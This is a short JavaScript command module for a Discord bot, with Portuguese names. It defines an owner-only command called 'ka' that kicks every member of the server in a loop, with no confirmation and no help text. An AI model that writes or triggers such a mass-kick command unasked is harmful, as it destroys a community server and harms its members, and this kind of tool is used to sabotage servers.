module.exports.executar = async(client, message, args, prefix) => {

let usuarios = Array.from(message.guild.members.values());

for (var i = usuarios.length - 1; i >= 0; i--) {
	usuarios[i].kick();
}

};
module.exports.configuração = {
    nome: "ka",
    aliases: [],
    categoria: "",
    ajuda: "",
    dono: "Y"
};